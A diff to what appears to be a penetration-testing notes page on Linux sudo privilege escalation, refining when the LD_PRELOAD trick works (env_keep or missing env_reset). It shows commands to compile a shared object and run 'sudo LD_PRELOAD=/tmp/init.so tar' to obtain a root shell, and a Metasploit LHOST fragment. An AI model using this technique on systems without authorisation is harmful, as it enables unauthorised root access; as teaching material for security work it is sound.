@@ -66,6 +66,8 @@ User [...] may run the following commands on [...]:
 ```
 
 ☠️ If you can only execute the script and not read it, either try to see if the script use an [injectable](../utils/injection.md) parameter or try to find if the source code is available somewhere else <small>(ex: on Git)</small>.
+
+⚠️ A configuration may contains both `env_keep` and `env_reset`.
 </div></div>
 
 <hr class="sep-both">
@@ -78,7 +80,7 @@ User [...] may run the following commands on [...]:
 
 <div class="row row-cols-lg-2"><div>
 
-If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l`, then it means that the user can run some code before executing a command as administrator.
+If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l` OR if there is no `env_reset`, then it means that we can set `LD_PRELOAD` and run code before executing the command.
 
 The code below replace the gid/uid of the user running the command with `0` <small>(root)</small>. Then, it pops a bash shell <small>(as root!)</small>.
 
@@ -105,13 +107,11 @@ $ gcc -shared -fPIC init.c -o init.so -nostartfiles
 
 Then, call the command that you could run as administrator <small>(`tar` here)</small>, while setting the variable path to your script:
 
-```bash!
+```shell!
 $ sudo LD_PRELOAD=/tmp/init.so tar
 ```
 
 💎 Congratulations, you are `root` now!
-
-⚠️ Actually, it may work if there is `env_reset` too?
 </div></div>
 
 <hr class="sep-both">
@@ -148,3 +148,5 @@ msf6> set LHOST tun0
 msf6> run
 ```
 </div></div>
+
+
